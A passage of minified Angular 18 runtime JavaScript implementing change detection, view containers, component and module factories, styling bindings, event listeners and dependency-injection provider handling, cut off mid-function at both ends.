t.firstCreatePass&&(t.incompleteFirstPass=!0,t.firstCreatePass=!1),r}finally{e[b]&=-5,Xu()}}function NT(t,e){for(let n=0;n<e.length;n++)AT(t,e[n])}function dm(t,e){return!e||e.firstChild===null||xv(t)}function RT(t,e,n,r=!0){let i=e[k];if(jS(i,e,t,n),r){let s=Au(n,t),a=e[Ae],c=Gv(a,t[Fn]);c!==null&&LS(i,t[nt],a,e,c,s)}let o=e[ca];o!==null&&o.firstChild!==null&&(o.firstChild=null)}function _a(t,e,n,r,i=!1){for(;n!==null;){if(n.type===128){n=i?n.projectionNext:n.next;continue}let o=e[n.index];o!==null&&r.push(pt(o)),Ot(o)&&xT(o,r);let s=n.type;if(s&8)_a(t,e,n.child,r);else if(s&32){let a=ld(n,e),c;for(;c=a();)r.push(c)}else if(s&16){let a=Yv(e,n);if(Array.isArray(a))r.push(...a);else{let c=Ln(e[ft]);_a(c[k],c,a,r,!0)}}n=i?n.projectionNext:n.next}return r}function xT(t,e){for(let n=$e;n<t.length;n++){let r=t[n],i=r[k].firstChild;i!==null&&_a(r[k],r,i,e)}t[Fn]!==t[xt]&&e.push(t[Fn])}var ly=[];function OT(t){return t[Be]??PT(t)}function PT(t){let e=ly.pop()??Object.create(FT);return e.lView=t,e}function kT(t){t.lView[Be]!==t&&(t.lView=null,ly.push(t))}var FT=x(v({},ji),{consumerIsAlwaysLive:!0,consumerMarkedDirty:t=>{xa(t.lView)},consumerOnSignalRead(){this.lView[Be]=this}});function LT(t){let e=t[Be]??Object.create(VT);return e.lView=t,e}var VT=x(v({},ji),{consumerIsAlwaysLive:!0,consumerMarkedDirty:t=>{let e=Ln(t.lView);for(;e&&!uy(e[k]);)e=Ln(e);e&&ev(e)},consumerOnSignalRead(){this.lView[Be]=this}});function uy(t){return t.type!==2}var jT=100;function dy(t,e=!0,n=0){let r=t[Tt],i=r.rendererFactory,o=!1;o||i.begin?.();try{UT(t,n)}catch(s){throw e&&ay(t,s),s}finally{o||(i.end?.(),r.inlineEffectRunner?.flush())}}function UT(t,e){let n=sv();try{Qg(!0),Ru(t,e);let r=0;for(;Ra(t);){if(r===jT)throw new w(103,!1);r++,Ru(t,1)}}finally{Qg(n)}}function BT(t,e,n,r){let i=e[b];if((i&256)===256)return;let o=!1,s=!1;!o&&e[Tt].inlineEffectRunner?.flush(),Ju(e);let a=!0,c=null,l=null;o||(uy(t)?(l=OT(e),c=Is(l)):eg()===null?(a=!1,l=LT(e),c=Is(l)):e[Be]&&(El(e[Be]),e[Be]=null));try{Xm(e),$b(t.bindingStartIndex),n!==null&&ey(t,e,n,2,r);let u=(i&3)===3;if(!o)if(u){let f=t.preOrderCheckHooks;f!==null&&ea(e,f,null)}else{let f=t.preOrderHooks;f!==null&&ta(e,f,0,null),Yl(e,0)}if(s||$T(e),hy(e,0),t.contentQueries!==null&&sy(t,e),!o)if(u){let f=t.contentCheckHooks;f!==null&&ea(e,f)}else{let f=t.contentHooks;f!==null&&ta(e,f,1),Yl(e,1)}XS(t,e);let d=t.components;d!==null&&py(e,d,0);let h=t.viewQuery;if(h!==null&&Nu(2,h,r),!o)if(u){let f=t.viewCheckHooks;f!==null&&ea(e,f)}else{let f=t.viewHooks;f!==null&&ta(e,f,2),Yl(e,2)}if(t.firstUpdatePass===!0&&(t.firstUpdatePass=!1),e[ql]){for(let f of e[ql])f();e[ql]=null}o||(e[b]&=-73)}catch(u){throw o||xa(e),u}finally{l!==null&&(Il(l,c),a&&kT(l)),Xu()}}function hy(t,e){for(let n=Pv(t);n!==null;n=kv(n))for(let r=$e;r<n.length;r++){let i=n[r];fy(i,e)}}function $T(t){for(let e=Pv(t);e!==null;e=kv(e)){if(!(e[b]&ha.HasTransplantedViews))continue;let n=e[da];for(let r=0;r<n.length;r++){let i=n[r];ev(i)}}}function HT(t,e,n){let r=dn(e,t);fy(r,n)}function fy(t,e){Qu(t)&&Ru(t,e)}function Ru(t,e){let r=t[k],i=t[b],o=t[Be],s=!!(e===0&&i&16);if(s||=!!(i&64&&e===0),s||=!!(i&1024),s||=!!(o?.dirty&&wl(o)),s||=!1,o&&(o.dirty=!1),t[b]&=-9217,s)BT(r,t,r.template,t[St]);else if(i&8192){hy(t,1);let a=r.components;a!==null&&py(t,a,1)}}function py(t,e,n){for(let r=0;r<e.length;r++)HT(t,e[r],n)}function vd(t,e){let n=sv()?64:1088;for(t[Tt].changeDetectionScheduler?.notify(e);t;){t[b]|=n;let r=Ln(t);if(hu(t)&&!r)return t;t=r}return null}var Wr=class{get rootNodes(){let e=this._lView,n=e[k];return _a(n,e,n.firstChild,[])}constructor(e,n,r=!0){this._lView=e,this._cdRefInjectingView=n,this.notifyErrorHandler=r,this._appRef=null,this._attachedToViewContainer=!1}get context(){return this._lView[St]}set context(e){this._lView[St]=e}get destroyed(){return(this._lView[b]&256)===256}destroy(){if(this._appRef)this._appRef.detachView(this);else if(this._attachedToViewContainer){let e=this._lView[be];if(Ot(e)){let n=e[ua],r=n?n.indexOf(this):-1;r>-1&&(Tu(e,r),sa(n,r))}this._attachedToViewContainer=!1}Wv(this._lView[k],this._lView)}onDestroy(e){tv(this._lView,e)}markForCheck(){vd(this._cdRefInjectingView||this._lView,4)}detach(){this._lView[b]&=-129}reattach(){pu(this._lView),this._lView[b]|=128}detectChanges(){this._lView[b]|=1024,dy(this._lView,this.notifyErrorHandler)}checkNoChanges(){}attachToViewContainerRef(){if(this._appRef)throw new w(902,!1);this._attachedToViewContainer=!0}detachFromAppRef(){this._appRef=null;let e=hu(this._lView),n=this._lView[Zi];n!==null&&!e&&ud(n,this._lView),$v(this._lView[k],this._lView)}attachToAppRef(e){if(this._attachedToViewContainer)throw new w(902,!1);this._appRef=e;let n=hu(this._lView),r=this._lView[Zi];r!==null&&!n&&Hv(r,this._lView),pu(this._lView)}};var z$=new RegExp(`^(\\d+)*(${MS}|${AS})*(.*)`);var WT=()=>null;function hm(t,e){return WT(t,e)}var zr=class{},Fa=new I("",{providedIn:"root",factory:()=>!1});var gy=new I(""),my=new I(""),xu=class{},Ia=class{};function zT(t){let e=Error(`No component factory found for ${Te(t)}.`);return e[GT]=t,e}var GT="ngComponent";var Ou=class{resolveComponentFactory(e){throw zT(e)}},Gr=class{static{this.NULL=new Ou}},qr=class{},fn=(()=>{class t{constructor(){this.destroyNode=null}static{this.__NG_ELEMENT_ID__=()=>qT()}}return t})();function qT(){let t=me(),e=We(),n=dn(e.index,t);return(sn(n)?n:t)[Ae]}var YT=(()=>{class t{static{this.\u0275prov=E({token:t,providedIn:"root",factory:()=>null})}}return t})();function Pu(t,e,n){let r=n?t.styles:null,i=n?t.classes:null,o=0;if(e!==null)for(let s=0;s<e.length;s++){let a=e[s];if(typeof a=="number")o=a;else if(o==1)i=Vg(i,a);else if(o==2){let c=a,l=e[++s];r=Vg(r,c+": "+l+";")}}n?t.styles=r:t.stylesWithoutHost=r,n?t.classes=i:t.classesWithoutHost=i}var wa=class extends Gr{constructor(e){super(),this.ngModule=e}resolveComponentFactory(e){let n=Pn(e);return new Qi(n,this.ngModule)}};function fm(t,e){let n=[];for(let r in t){if(!t.hasOwnProperty(r))continue;let i=t[r];if(i===void 0)continue;let o=Array.isArray(i),s=o?i[0]:i,a=o?i[1]:an.None;e?n.push({propName:s,templateName:r,isSignal:(a&an.SignalBased)!==0}):n.push({propName:s,templateName:r})}return n}function KT(t){let e=t.toLowerCase();return e==="svg"?Mb:e==="math"?Nb:null}var Qi=class extends Ia{get inputs(){let e=this.componentDef,n=e.inputTransforms,r=fm(e.inputs,!0);if(n!==null)for(let i of r)n.hasOwnProperty(i.propName)&&(i.transform=n[i.propName]);return r}get outputs(){return fm(this.componentDef.outputs,!1)}constructor(e,n){super(),this.componentDef=e,this.ngModule=n,this.componentType=e.type,this.selector=lb(e.selectors),this.ngContentSelectors=e.ngContentSelectors?e.ngContentSelectors:[],this.isBoundToModule=!!n}create(e,n,r,i){let o=H(null);try{i=i||this.ngModule;let s=i instanceof He?i:i?.injector;s&&this.componentDef.getStandaloneInjector!==null&&(s=this.componentDef.getStandaloneInjector(s)||s);let a=s?new mu(e,s):e,c=a.get(qr,null);if(c===null)throw new w(407,!1);let l=a.get(YT,null),u=a.get(zr,null),d={rendererFactory:c,sanitizer:l,inlineEffectRunner:null,changeDetectionScheduler:u},h=c.createRenderer(null,this.componentDef),f=this.componentDef.selectors[0][0]||"div",g=r?iT(h,r,this.componentDef.encapsulation,a):Bv(h,f,KT(f)),_=512;this.componentDef.signals?_|=4096:this.componentDef.onPush||(_|=16);let C=null;g!==null&&(C=ad(g,a,!0));let R=ry(0,null,null,1,0,null,null,null,null,null,null),te=fd(null,R,null,_,null,null,d,h,a,null,C);Ju(te);let ne,_e,Et=null;try{let fe=this.componentDef,Ct,Fi=null;fe.findHostDirectiveDefs?(Ct=[],Fi=new Map,fe.findHostDirectiveDefs(fe,Ct,Fi),Ct.push(fe)):Ct=[fe];let Li=ZT(te,g);Et=QT(Li,g,fe,Ct,te,d,h),_e=Jm(R,kn),g&&e0(h,fe,g,r),n!==void 0&&t0(_e,this.ngContentSelectors,n),ne=XT(Et,fe,Ct,Fi,te,[n0]),cy(R,te,null)}catch(fe){throw Et!==null&&Du(Et),Du(te),fe}finally{Xu()}return new ku(this.componentType,ne,rd(_e,te),te,_e)}finally{H(o)}}},ku=class extends xu{constructor(e,n,r,i,o){super(),this.location=r,this._rootLView=i,this._tNode=o,this.previousInputValues=null,this.instance=n,this.hostView=this.changeDetectorRef=new Wr(i,void 0,!1),this.componentType=e}setInput(e,n){let r=this._tNode.inputs,i;if(r!==null&&(i=r[e])){if(this.previousInputValues??=new Map,this.previousInputValues.has(e)&&Object.is(this.previousInputValues.get(e),n))return;let o=this._rootLView;md(o[k],o,i,e,n),this.previousInputValues.set(e,n);let s=dn(this._tNode.index,o);vd(s,1)}}get injector(){return new On(this._tNode,this._rootLView)}destroy(){this.hostView.destroy()}onDestroy(e){this.hostView.onDestroy(e)}};function ZT(t,e){let n=t[k],r=kn;return t[r]=e,pd(n,r,2,"#host",null)}function QT(t,e,n,r,i,o,s){let a=i[k];JT(r,t,e,s);let c=null;e!==null&&(c=ad(e,i[Br]));let l=o.rendererFactory.createRenderer(e,n),u=16;n.signals?u=4096:n.onPush&&(u=64);let d=fd(i,ny(n),null,u,i[t.index],t,o,l,null,null,c);return a.firstCreatePass&&Mu(a,t,r.length-1),gd(i,d),i[t.index]=d}function JT(t,e,n,r){for(let i of t)e.mergedAttrs=qi(e.mergedAttrs,i.hostAttrs);e.mergedAttrs!==null&&(Pu(e,e.mergedAttrs,!0),n!==null&&Zv(r,n,e))}function XT(t,e,n,r,i,o){let s=We(),a=i[k],c=rt(s,i);iy(a,i,s,n,null,r);for(let u=0;u<n.length;u++){let d=s.directiveStart+u,h=$r(i,a,d,s);Hr(h,i)}oy(a,i,s),c&&Hr(c,i);let l=$r(i,a,s.directiveStart+s.componentOffset,s);if(t[St]=i[St]=l,o!==null)for(let u of o)u(l,e);return ty(a,s,i),l}function e0(t,e,n,r){if(r)cu(t,n,["ng-version","18.2.13"]);else{let{attrs:i,classes:o}=ub(e.selectors[0]);i&&cu(t,n,i),o&&o.length>0&&Kv(t,n,o.join(" "))}}function t0(t,e,n){let r=t.projection=[];for(let i=0;i<e.length;i++){let o=n[i];r.push(o!=null?Array.from(o):null)}}function n0(){let t=We();mv(me()[k],t)}var La=(()=>{class t{static{this.__NG_ELEMENT_ID__=r0}}return t})();function r0(){let t=We();return o0(t,me())}var i0=La,vy=class extends i0{constructor(e,n,r){super(),this._lContainer=e,this._hostTNode=n,this._hostLView=r}get element(){return rd(this._hostTNode,this._hostLView)}get injector(){return new On(this._hostTNode,this._hostLView)}get parentInjector(){let e=ed(this._hostTNode,this._hostLView);if(yv(e)){let n=pa(e,this._hostLView),r=fa(e),i=n[k].data[r+8];return new On(i,n)}else return new On(null,this._hostLView)}clear(){for(;this.length>0;)this.remove(this.length-1)}get(e){let n=pm(this._lContainer);return n!==null&&n[e]||null}get length(){return this._lContainer.length-$e}createEmbeddedView(e,n,r){let i,o;typeof r=="number"?i=r:r!=null&&(i=r.index,o=r.injector);let s=hm(this._lContainer,e.ssrId),a=e.createEmbeddedViewImpl(n||{},o,s);return this.insertImpl(a,i,dm(this._hostTNode,s)),a}createComponent(e,n,r,i,o){let s=e&&!bb(e),a;if(s)a=n;else{let g=n||{};a=g.index,r=g.injector,i=g.projectableNodes,o=g.environmentInjector||g.ngModuleRef}let c=s?e:new Qi(Pn(e)),l=r||this.parentInjector;if(!o&&c.ngModule==null){let _=(s?l:this.parentInjector).get(He,null);_&&(o=_)}let u=Pn(c.componentType??{}),d=hm(this._lContainer,u?.id??null),h=d?.firstChild??null,f=c.create(l,i,h,o);return this.insertImpl(f.hostView,a,dm(this._hostTNode,d)),f}insert(e,n){return this.insertImpl(e,n,!0)}insertImpl(e,n,r){let i=e._lView;if(xb(i)){let a=this.indexOf(e);if(a!==-1)this.detach(a);else{let c=i[be],l=new vy(c,c[nt],c[be]);l.detach(l.indexOf(e))}}let o=this._adjustIndex(n),s=this._lContainer;return RT(s,i,o,r),e.attachToViewContainerRef(),Mm(Xl(s),o,e),e}move(e,n){return this.insert(e,n)}indexOf(e){let n=pm(this._lContainer);return n!==null?n.indexOf(e):-1}remove(e){let n=this._adjustIndex(e,-1),r=Tu(this._lContainer,n);r&&(sa(Xl(this._lContainer),n),Wv(r[k],r))}detach(e){let n=this._adjustIndex(e,-1),r=Tu(this._lContainer,n);return r&&sa(Xl(this._lContainer),n)!=null?new Wr(r):null}_adjustIndex(e,n=0){return e??this.length+n}};function pm(t){return t[ua]}function Xl(t){return t[ua]||(t[ua]=[])}function o0(t,e){let n,r=e[t.index];return Ot(r)?n=r:(n=bT(r,e,null,t),e[t.index]=n,gd(e,n)),a0(n,e,t,r),new vy(n,t,e)}function s0(t,e){let n=t[Ae],r=n.createComment(""),i=rt(e,t),o=Gv(n,i);return ya(n,o,r,WS(n,i),!1),r}var a0=c0;function c0(t,e,n,r){if(t[Fn])return;let i;n.type&8?i=pt(r):i=s0(e,n),t[Fn]=i}var gm=new Set;function io(t){gm.has(t)||(gm.add(t),performance?.mark?.("mark_feature_usage",{detail:{feature:t}}))}function oo(t,e){io("NgSignals");let n=dg(t),r=n[Qt];return e?.equal&&(r.equal=e.equal),n.set=i=>Cl(r,i),n.update=i=>hg(r,i),n.asReadonly=l0.bind(n),n}function l0(){let t=this[Qt];if(t.readonlyFn===void 0){let e=()=>this();e[Qt]=t,t.readonlyFn=e}return t.readonlyFn}function u0(t){return Object.getPrototypeOf(t.prototype).constructor}function mt(t){let e=u0(t.type),n=!0,r=[t];for(;e;){let i;if(cn(t))i=e.\u0275cmp||e.\u0275dir;else{if(e.\u0275cmp)throw new w(903,!1);i=e.\u0275dir}if(i){if(n){r.push(i);let s=t;s.inputs=Zs(t.inputs),s.inputTransforms=Zs(t.inputTransforms),s.declaredInputs=Zs(t.declaredInputs),s.outputs=Zs(t.outputs);let a=i.hostBindings;a&&g0(t,a);let c=i.viewQuery,l=i.contentQueries;if(c&&f0(t,c),l&&p0(t,l),d0(t,i),AD(t.outputs,i.outputs),cn(i)&&i.data.animation){let u=t.data;u.animation=(u.animation||[]).concat(i.data.animation)}}let o=i.features;if(o)for(let s=0;s<o.length;s++){let a=o[s];a&&a.ngInherit&&a(t),a===mt&&(n=!1)}}e=Object.getPrototypeOf(e)}h0(r)}function d0(t,e){for(let n in e.inputs){if(!e.inputs.hasOwnProperty(n)||t.inputs.hasOwnProperty(n))continue;let r=e.inputs[n];if(r!==void 0&&(t.inputs[n]=r,t.declaredInputs[n]=e.declaredInputs[n],e.inputTransforms!==null)){let i=Array.isArray(r)?r[0]:r;if(!e.inputTransforms.hasOwnProperty(i))continue;t.inputTransforms??={},t.inputTransforms[i]=e.inputTransforms[i]}}}function h0(t){let e=0,n=null;for(let r=t.length-1;r>=0;r--){let i=t[r];i.hostVars=e+=i.hostVars,i.hostAttrs=qi(i.hostAttrs,n=qi(n,i.hostAttrs))}}function Zs(t){return t===Vr?{}:t===Ue?[]:t}function f0(t,e){let n=t.viewQuery;n?t.viewQuery=(r,i)=>{e(r,i),n(r,i)}:t.viewQuery=e}function p0(t,e){let n=t.contentQueries;n?t.contentQueries=(r,i,o)=>{e(r,i,o),n(r,i,o)}:t.contentQueries=e}function g0(t,e){let n=t.hostBindings;n?t.hostBindings=(r,i)=>{e(r,i),n(r,i)}:t.hostBindings=e}var ln=class{},Ji=class{};var Fu=class extends ln{constructor(e,n,r,i=!0){super(),this.ngModuleType=e,this._parent=n,this._bootstrapComponents=[],this.destroyCbs=[],this.componentFactoryResolver=new wa(this);let o=Lm(e);this._bootstrapComponents=Uv(o.bootstrap),this._r3Injector=Tv(e,n,[{provide:ln,useValue:this},{provide:Gr,useValue:this.componentFactoryResolver},...r],Te(e),new Set(["environment"])),i&&this.resolveInjectorInitializers()}resolveInjectorInitializers(){this._r3Injector.resolveInjectorInitializers(),this.instance=this._r3Injector.get(this.ngModuleType)}get injector(){return this._r3Injector}destroy(){let e=this._r3Injector;!e.destroyed&&e.destroy(),this.destroyCbs.forEach(n=>n()),this.destroyCbs=null}onDestroy(e){this.destroyCbs.push(e)}},Lu=class extends Ji{constructor(e){super(),this.moduleType=e}create(e){return new Fu(this.moduleType,e,[])}};var Ea=class extends ln{constructor(e){super(),this.componentFactoryResolver=new wa(this),this.instance=null;let n=new Yi([...e.providers,{provide:ln,useValue:this},{provide:Gr,useValue:this.componentFactoryResolver}],e.parent||Zu(),e.debugName,new Set(["environment"]));this.injector=n,e.runEnvironmentInitializers&&n.resolveInjectorInitializers()}destroy(){this.injector.destroy()}onDestroy(e){this.injector.onDestroy(e)}};function yd(t,e,n=null){return new Ea({providers:t,parent:e,debugName:n,runEnvironmentInitializers:!0}).injector}function yy(t,e,n){let r=t[e];return Object.is(r,n)?!1:(t[e]=n,!0)}function m0(t){return(t.flags&32)===32}var Wi=function(t){return t[t.EarlyRead=0]="EarlyRead",t[t.Write=1]="Write",t[t.MixedReadWrite=2]="MixedReadWrite",t[t.Read=3]="Read",t}(Wi||{}),v0=(()=>{class t{constructor(){this.impl=null}execute(){this.impl?.execute()}static{this.\u0275prov=E({token:t,providedIn:"root",factory:()=>new t})}}return t})(),mm=class t{constructor(){this.ngZone=y(Y),this.scheduler=y(zr),this.errorHandler=y(At,{optional:!0}),this.sequences=new Set,this.deferredRegistrations=new Set,this.executing=!1}static{this.PHASES=[Wi.EarlyRead,Wi.Write,Wi.MixedReadWrite,Wi.Read]}execute(){this.executing=!0;for(let e of t.PHASES)for(let n of this.sequences)if(!(n.erroredOrDestroyed||!n.hooks[e]))try{n.pipelinedValue=this.ngZone.runOutsideAngular(()=>n.hooks[e](n.pipelinedValue))}catch(r){n.erroredOrDestroyed=!0,this.errorHandler?.handleError(r)}this.executing=!1;for(let e of this.sequences)e.afterRun(),e.once&&(this.sequences.delete(e),e.destroy());for(let e of this.deferredRegistrations)this.sequences.add(e);this.deferredRegistrations.size>0&&this.scheduler.notify(7),this.deferredRegistrations.clear()}register(e){this.executing?this.deferredRegistrations.add(e):(this.sequences.add(e),this.scheduler.notify(6))}unregister(e){this.executing&&this.sequences.has(e)?(e.erroredOrDestroyed=!0,e.pipelinedValue=void 0,e.once=!0):(this.sequences.delete(e),this.deferredRegistrations.delete(e))}static{this.\u0275prov=E({token:t,providedIn:"root",factory:()=>new t})}};function Qs(t,e){return t<<17|e<<2}function Un(t){return t>>17&32767}function y0(t){return(t&2)==2}function _0(t,e){return t&131071|e<<17}function Vu(t){return t|2}function Yr(t){return(t&131068)>>2}function eu(t,e){return t&-131069|e<<2}function I0(t){return(t&1)===1}function ju(t){return t|1}function w0(t,e,n,r,i,o){let s=o?e.classBindings:e.styleBindings,a=Un(s),c=Yr(s);t[r]=n;let l=!1,u;if(Array.isArray(n)){let d=n;u=d[1],(u===null||to(d,u)>0)&&(l=!0)}else u=n;if(i)if(c!==0){let h=Un(t[a+1]);t[r+1]=Qs(h,a),h!==0&&(t[h+1]=eu(t[h+1],r)),t[a+1]=_0(t[a+1],r)}else t[r+1]=Qs(a,0),a!==0&&(t[a+1]=eu(t[a+1],r)),a=r;else t[r+1]=Qs(c,0),a===0?a=r:t[c+1]=eu(t[c+1],r),c=r;l&&(t[r+1]=Vu(t[r+1])),vm(t,u,r,!0),vm(t,u,r,!1),E0(e,u,t,r,o),s=Qs(a,c),o?e.classBindings=s:e.styleBindings=s}function E0(t,e,n,r,i){let o=i?t.residualClasses:t.residualStyles;o!=null&&typeof e=="string"&&to(o,e)>=0&&(n[r+1]=ju(n[r+1]))}function vm(t,e,n,r){let i=t[n+1],o=e===null,s=r?Un(i):Yr(i),a=!1;for(;s!==0&&(a===!1||o);){let c=t[s],l=t[s+1];C0(c,e)&&(a=!0,t[s+1]=r?ju(l):Vu(l)),s=r?Un(l):Yr(l)}a&&(t[n+1]=r?Vu(i):ju(i))}function C0(t,e){return t===null||e==null||(Array.isArray(t)?t[1]:t)===e?!0:Array.isArray(t)&&typeof e=="string"?to(t,e)>=0:!1}function Va(t,e,n){let r=me(),i=Hb();if(yy(r,i,e)){let o=Pt(),s=Zb();uT(o,s,r,t,e,r[Ae],n,!1)}return Va}function ym(t,e,n,r,i){let o=e.inputs,s=i?"class":"style";md(t,n,o[s],s,r)}function ja(t,e){return D0(t,e,null,!0),ja}function D0(t,e,n,r){let i=me(),o=Pt(),s=Wb(2);if(o.firstUpdatePass&&S0(o,t,s,r),e!==ka&&yy(i,s,e)){let a=o.data[ro()];R0(o,a,i,i[Ae],t,i[s+1]=x0(e,n),r,s)}}function b0(t,e){return e>=t.expandoStartIndex}function S0(t,e,n,r){let i=t.data;if(i[n+1]===null){let o=i[ro()],s=b0(t,n);O0(o,r)&&e===null&&!s&&(e=!1),e=T0(i,o,e,r),w0(i,o,e,n,s,r)}}function T0(t,e,n,r){let i=Yb(t),o=r?e.residualClasses:e.residualStyles;if(i===null)(r?e.classBindings:e.styleBindings)===0&&(n=tu(null,t,e,n,r),n=Xi(n,e.attrs,r),o=null);else{let s=e.directiveStylingLast;if(s===-1||t[s]!==i)if(n=tu(i,t,e,n,r),o===null){let c=A0(t,e,r);c!==void 0&&Array.isArray(c)&&(c=tu(null,t,e,c[1],r),c=Xi(c,e.attrs,r),M0(t,e,r,c))}else o=N0(t,e,r)}return o!==void 0&&(r?e.residualClasses=o:e.residualStyles=o),n}function A0(t,e,n){let r=n?e.classBindings:e.styleBindings;if(Yr(r)!==0)return t[Un(r)]}function M0(t,e,n,r){let i=n?e.classBindings:e.styleBindings;t[Un(i)]=r}function N0(t,e,n){let r,i=e.directiveEnd;for(let o=1+e.directiveStylingLast;o<i;o++){let s=t[o].hostAttrs;r=Xi(r,s,n)}return Xi(r,e.attrs,n)}function tu(t,e,n,r,i){let o=null,s=n.directiveEnd,a=n.directiveStylingLast;for(a===-1?a=n.directiveStart:a++;a<s&&(o=e[a],r=Xi(r,o.hostAttrs,i),o!==t);)a++;return t!==null&&(n.directiveStylingLast=a),r}function Xi(t,e,n){let r=n?1:2,i=-1;if(e!==null)for(let o=0;o<e.length;o++){let s=e[o];typeof s=="number"?i=s:i===r&&(Array.isArray(t)||(t=t===void 0?[]:["",t]),ZD(t,s,n?!0:e[++o]))}return t===void 0?null:t}function R0(t,e,n,r,i,o,s,a){if(!(e.type&3))return;let c=t.data,l=c[a+1],u=I0(l)?_m(c,e,n,i,Yr(l),s):void 0;if(!Ca(u)){Ca(o)||y0(l)&&(o=_m(c,null,n,i,a,s));let d=Rb(ro(),n);QS(r,s,d,i,o)}}function _m(t,e,n,r,i,o){let s=e===null,a;for(;i>0;){let c=t[i],l=Array.isArray(c),u=l?c[1]:c,d=u===null,h=n[i+1];h===ka&&(h=d?Ue:void 0);let f=d?zl(h,r):u===r?h:void 0;if(l&&!Ca(f)&&(f=zl(c,r)),Ca(f)&&(a=f,s))return a;let g=t[i+1];i=s?Un(g):Yr(g)}if(e!==null){let c=o?e.residualClasses:e.residualStyles;c!=null&&(a=zl(c,r))}return a}function Ca(t){return t!==void 0}function x0(t,e){return t==null||t===""||(typeof e=="string"?t=t+e:typeof t=="object"&&(t=Te(cd(t)))),t}function O0(t,e){return(t.flags&(e?8:16))!==0}function P0(t,e,n,r,i,o){let s=e.consts,a=Zg(s,i),c=pd(e,t,2,r,a);return hT(e,n,c,Zg(s,o)),c.attrs!==null&&Pu(c,c.attrs,!1),c.mergedAttrs!==null&&Pu(c,c.mergedAttrs,!0),e.queries!==null&&e.queries.elementStart(e,c),c}function B(t,e,n,r){let i=me(),o=Pt(),s=kn+t,a=i[Ae],c=o.firstCreatePass?P0(s,o,i,e,n,r):o.data[s],l=k0(o,i,c,a,e,t);i[s]=l;let u=qm(c);return Oa(c,!0),Zv(a,l,c),!m0(c)&&pv()&&qv(o,i,l,c),Pb()===0&&Hr(l,i),kb(),u&&(tT(o,i,c),ty(o,c,i)),r!==null&&nT(i,c),B}function z(){let t=We();ov()?Bb():(t=t.parent,Oa(t,!1));let e=t;Vb(e)&&jb(),Fb();let n=Pt();return n.firstCreatePass&&(mv(n,t),Gm(t)&&n.queries.elementEnd(t)),e.classesWithoutHost!=null&&tS(e)&&ym(n,e,me(),e.classesWithoutHost,!0),e.stylesWithoutHost!=null&&nS(e)&&ym(n,e,me(),e.stylesWithoutHost,!1),z}function Re(t,e,n,r){return B(t,e,n,r),z(),Re}var k0=(t,e,n,r,i,o)=>(gv(!0),Bv(r,i,Qb()));var Da="en-US";var F0=Da;function L0(t){typeof t=="string"&&(F0=t.toLowerCase().replace(/_/g,"-"))}var V0=(t,e,n)=>{};function Ft(t,e,n,r){let i=me(),o=Pt(),s=We();return U0(o,i,i[Ae],s,t,e,r),Ft}function j0(t,e,n,r){let i=t.cleanup;if(i!=null)for(let o=0;o<i.length-1;o+=2){let s=i[o];if(s===n&&i[o+1]===r){let a=e[la],c=i[o+2];return a.length>c?a[c]:null}typeof s=="string"&&(o+=2)}return null}function U0(t,e,n,r,i,o,s){let a=qm(r),l=t.firstCreatePass&&TT(t),u=e[St],d=ST(e),h=!0;if(r.type&3||s){let _=rt(r,e),C=s?s(_):_,R=d.length,te=s?_e=>s(pt(_e[r.index])):r.index,ne=null;if(!s&&a&&(ne=j0(t,e,i,r.index)),ne!==null){let _e=ne.__ngLastListenerFn__||ne;_e.__ngNextListenerFn__=o,ne.__ngLastListenerFn__=o,h=!1}else{o=wm(r,e,u,o),V0(_,i,o);let _e=n.listen(C,i,o);d.push(o,_e),l&&l.push(i,te,R,R+1)}}else o=wm(r,e,u,o);let f=r.outputs,g;if(h&&f!==null&&(g=f[i])){let _=g.length;if(_)for(let C=0;C<_;C+=2){let R=g[C],te=g[C+1],Et=e[R][te].subscribe(o),fe=d.length;d.push(o,Et),l&&l.push(i,r.index,fe,-(fe+1))}}}function Im(t,e,n,r){let i=H(null);try{return ut(6,e,n),n(r)!==!1}catch(o){return ay(t,o),!1}finally{ut(7,e,n),H(i)}}function wm(t,e,n,r){return function i(o){if(o===Function)return r;let s=t.componentOffset>-1?dn(t.index,e):e;vd(s,5);let a=Im(e,n,r,o),c=i.__ngNextListenerFn__;for(;c;)a=Im(e,n,c,o)&&a,c=c.__ngNextListenerFn__;return a}}function J(t,e=""){let n=me(),r=Pt(),i=t+kn,o=r.firstCreatePass?pd(r,i,1,e,null):r.data[i],s=B0(r,n,o,e,t);n[i]=s,pv()&&qv(r,n,s,o),Oa(o,!1)}var B0=(t,e,n,r,i)=>(gv(!0),kS(e[Ae],r));function $0(t,e,n){let r=Pt();if(r.firstCreatePass){let i=cn(t);Uu(n,r.data,r.blueprint,i,!0),Uu(e,r.data,r.blueprint,i,!1)}}function Uu(t,e,n,r,i){if(t=De(t),Array.isArray(t))for(let o=0;o<t.length;o++)Uu(t[o],e,n,r,i);else{let o=Pt(),s=me(),a=We(),c=Ur(t)?t:De(t.provide),l=Hm(t),u=a.providerIndexes&1048575,d=a.directiveStart,h=a.providerIndexes>>20;if(Ur(t)||!t.multi){let f=new jn(l,i,W),g=ru(c,e,i?u:u+h,d);g===-1?(yu(ga(a,s),o,c),nu(o,t,e.length),e.push(c),a.directiveStart++,a.directiveEnd++,i&&(a.providerIndexes+=1048576),n.push(f),s.push(f)):(n[g]=f,s[g]=f)}else{let f=ru(c,e,u+h,d),g=ru(c,e,u,u+h),_=f>=0&&n[f],C=g>=0&&n[g];if(i&&!C||!i&&!_){yu(ga(a,s),o,c);let R=z0(i?W0:H0,n.length,i,r,l);!i&&C&&(n[g].providerFactory=R),nu(o,t,e.length,0),e.push(c),a.directiveStart++,a.directiveEnd++,i&&(a.providerIndexes+=1048576),n.push(R),s.push(R)}else{let R=_y(n[i?g:f],l,!i&&r);nu(o,t,f>-1?f:g,R)}!i&&r&&C&&n[g].componentProviders++}}}function nu(t,e,n,r){let i=Ur(e),o=vb(e);if(i||o){let c=(o?De(e.useClass):e).prototype.ngOnDestroy;if(c){let l=t.destroyHooks||(t.destroyHooks=[]);if(!i&&e.multi){let u=l.indexOf(n);u===-1?l.push(n,[r,c]):l[u+1].push(r,c)}else l.push(n,c)}}}function _y(t,e,n){return n&&t.componentProviders++,t.multi.push(e)-1}function ru(t,e,n,r){for(let i=n;i<r;i++)if(e[i]===t)return i;return-1}function H0(t,e,n,r){return Bu(this.multi,[])}function W0(t,e,n,r){let i=this.multi,o;if(this.providerFactory){let s=this.providerFactory.componentProviders,a=$r(n,n[k],this.providerFactory.index,r);o=a.slice(0,s),Bu(i,o);for(let c=s;c<a.length;c++)o.push(a[c])}else o=[],Bu(i,o);return o}function Bu(t,e){for(let n=0;n<t.length;n++){let r=t[n];e.push(r())}return e}function 